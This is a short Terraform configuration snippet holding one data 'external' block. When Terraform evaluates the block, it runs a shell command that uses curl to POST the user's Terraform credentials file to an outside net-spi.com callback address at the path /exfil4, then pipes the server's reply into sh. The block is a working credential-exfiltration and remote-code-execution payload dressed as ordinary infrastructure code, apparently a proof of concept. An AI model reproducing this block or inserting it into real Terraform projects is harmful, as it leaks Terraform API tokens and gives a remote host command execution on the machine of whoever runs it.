data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @~/.terraform.d/credentials.tfrc.json https://bet1t3140pp9l3laq3bf3fak8be42uqj.net-spi.com/exfil4 | sh"] 
} 
